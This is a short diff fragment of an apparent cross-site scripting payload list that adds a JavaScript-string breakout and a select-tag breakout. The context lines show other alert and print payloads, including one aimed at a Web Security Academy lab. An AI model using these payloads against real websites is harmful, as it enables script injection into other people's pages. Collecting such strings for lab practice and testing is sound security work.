@@ -7,3 +7,5 @@ Threatspec  -- https://onehack.us/t/threatspec-continuous-threat-modeling-throug
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 "onmouseover="alert(1)
 javascript:alert(1)
+'-alert(1)-'
+ "></select><img%20src=1%20onerror=alert(1)>
